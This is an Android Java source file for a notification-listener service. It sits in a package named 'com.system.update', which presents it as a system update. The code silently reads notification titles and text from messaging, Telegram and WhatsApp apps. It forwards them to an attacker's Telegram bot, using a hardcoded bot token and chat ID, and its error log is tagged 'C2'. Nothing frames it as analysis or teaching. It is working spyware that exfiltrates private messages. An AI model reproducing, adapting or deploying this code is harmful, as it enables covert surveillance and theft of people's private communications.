package com.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class NotificationListener extends NotificationListenerService {
    private static final String BOT_TOKEN = "9149088713:AAHDnVftf8JvwlzSKtVhEcd5lioeyn7-cpI";
    private static final String CHAT_ID = "6717914771";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String packageName = sbn.getPackageName();
        if (packageName == null) return;
        
        if (packageName.contains("messaging") || packageName.contains("telegram") || packageName.contains("whatsapp")) {
            android.os.Bundle extras = sbn.getNotification().extras;
            String title = extras.getString("android.title");
            String text = extras.getString("android.text");
            if (text != null) {
                sendMessage("[" + packageName + "] " + title + ": " + text);
            }
        }
    }

    private void sendMessage(String text) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {
            Log.e("C2", "send err", e);
        }
    }
}
